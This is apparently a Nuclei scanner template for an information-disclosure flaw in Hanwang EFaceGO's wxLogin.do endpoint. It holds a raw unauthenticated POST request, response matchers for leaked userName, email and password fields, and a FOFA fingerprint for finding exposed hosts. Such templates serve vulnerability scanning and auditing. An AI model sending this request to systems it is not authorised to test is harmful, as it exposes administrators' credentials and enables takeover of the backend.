http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - '"userName":'
            - '"email":'
            - '"password":'
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
id: hanwang-EFaceGO-wxLogin_do-Information-disclosure
info:
    author: Superhero
    description: |-
        fofa: icon_hash="1380907357"
        汉王EFaceGO wxLogin.do存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取网站后台系统用户密码等敏感信息，从而登录网站后台系统，使网站处于极不安全的状态。
    name: 汉王EFaceGO wxLogin.do 信息泄露漏洞
    reference:
        - https://mp.weixin.qq.com/s/C7miSQDWJknXrwREsQedSQ
    severity: medium
    tags:
        - Information disclosure
